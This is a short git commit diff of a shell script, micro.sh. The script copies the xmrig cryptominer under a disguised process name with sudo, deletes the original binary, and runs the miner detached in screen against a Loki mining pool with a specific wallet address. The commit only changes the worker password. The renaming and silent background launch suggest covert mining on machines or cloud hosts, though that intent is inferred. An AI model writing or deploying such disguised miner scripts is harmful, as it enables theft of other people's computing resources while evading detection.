24ebc0207e20e11fbffc6db50d591c3183ad458a
charlesmalexander64 <55861927+charlesmalexander64@users.noreply.github.com>
2019-11-08 09:49:38 +0700

    Update micro.sh

--- micro.sh
+++ micro.sh
@@ -13,4 +13,4 @@ mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p priceaction -a rx/loki -k
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p makersers -a rx/loki -k
